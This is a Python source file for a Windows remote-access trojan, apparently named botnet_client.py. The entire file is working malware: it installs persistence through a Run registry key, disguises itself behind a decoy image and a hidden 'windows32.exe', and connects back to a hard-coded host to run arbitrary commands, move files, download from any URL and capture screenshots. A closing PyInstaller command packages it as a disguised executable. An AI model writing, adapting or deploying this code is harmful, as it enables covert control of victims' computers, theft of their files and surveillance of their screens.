import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import ctypes


# create the persistance
location = os.environ['appdata']+'\\windows32.exe'


if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v hollySteam /t REG_SZ /d "'+location+'"', shell=True)

    # opening the program with the img
    file_name = sys._MEIPASS + "\chaves.jpg"
    try:
        subprocess.Popen(file_name,shell=True)
    #bypass the antivirus
    except:
        n1 = 1
        n2 = 2
        n3 = n1+n2

def connection():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.8", 4444))

            result = shell(s)

            if result == "exit":
                print("Session ended. Waiting for new server...")
                time.sleep(5)
                continue

            if result == "disconnect":
                print("Lost connection. Reconnecting...")
                time.sleep(5)
                continue

        except:
            time.sleep(5)

        finally:
            try:
                s.close()
            except:
                pass


def reliable_send(s, data):
    json_data = json.dumps(data)
    s.sendall(json_data.encode('utf-8'))


def reliable_recv(s):
    data = ''
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                return None
            
            data += chunk.decode('utf-8')
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                continue
        except:
            return None


# check privileges
def is_admin():
    global admin
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            admin = "[!!] Admin privileges!"
        else:
            admin = "[!!] User privileges!"
    except:
        admin = "[!!] User privileges!"

def shell(s):
    while True:
        command = reliable_recv(s)

        if not command:
            return 'disconnect' # try reconnect

        if command == 'q':
            continue

        elif command == 'exit':
            return 'exit'
        
        elif command.startswith("sendall "):
            cmd = command[8:]
            try:
                subprocess.Popen(cmd, shell=True)
                reliable_send(s, "[+] Command executed on client.")
            except:
                reliable_send(s, "[!] Failed to execute command.")



        elif command == '--help':
            help = '''                  
                    dcp         --> Download file from target PC
                    ucp         --> Upload file to target PC
                    wget        --> Download file to target PC from any website
                    startp      --> Start a program on target PC
                    scrshot     --> Take a screenshot of targets monitor
                    checkme     --> Cehck for adm privileges
                    q           --> exit the reverse shell
                    '''
            reliable_send(s,help)

        elif command[:2] == 'cd':
            try:
                os.chdir(command[3:])
            except:
                pass

        # download file
        elif command[:3] == 'dcp':
            with open(command[4:], 'rb') as f:
                reliable_send(s, base64.b64encode(f.read()).decode('ascii'))

        # upload file
        elif command[:3] == 'ucp':
            with open(command[4:], 'wb') as f:
                file_content = reliable_recv(s)
                f.write(base64.b64decode(file_content))

        # download internet
        elif command[:4] == 'wget':
                try:
                    download(command[5:])
                    reliable_send(s,"[+] File downloaded!")
                except:
                    reliable_send(s,"[+] Download failed!")

        # screenshot
        elif command[:7] == 'scrshot':
            try:
                screenshot()
                with open('monitor-1.png','rb') as f:
                    img_b64 = base64.b64encode(f.read()).decode('ascii')
                    reliable_send(s, img_b64)
                os.remove('monitor-1.png')
            except Exception as e:
                reliable_send(s, "[+] Failed to take screenshot!")
        
        #check privileges
        elif command[:7] == 'checkme':
            try:
                is_admin()
                reliable_send(s,admin)
            except:
                reliable_send(s,'[+] Impossible to check!')

        #start a windows program from terminal
        elif command[:6] == 'startp':
            try:
                subprocess.Popen(command[7:],shell=True)
                reliable_send(s,'[+] started!')
            except:
                reliable_send(s,'[+] failed to start!')

        else:
            try:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT
                )
                reliable_send(s, output.decode('utf-8', errors='ignore'))
            except subprocess.CalledProcessError as e:
                reliable_send(s, "[!!] Command failed:\n" + e.output.decode('utf-8', errors='ignore'))
            except Exception as e:
                reliable_send(s, "[!!] Error executing command: " + str(e))


# download from internet
def download(url):
    get_resonse = requests.get(url)
    file_name = url.split("/")[-1] # sebsite.com/file/img/python.exe
    with open(file_name,'wb') as f:
        f.write(get_resonse.content)

# screenshot painel
def screenshot():
    with mss() as scr:
        scr.shot()

#ocult the exe
os.system(f'attrib +h {location}')

connection()

# pyinstaller --add-data "chaves.jpg;." --onefile --windowed --noconsole --ico=chaves.ico botnet_client.py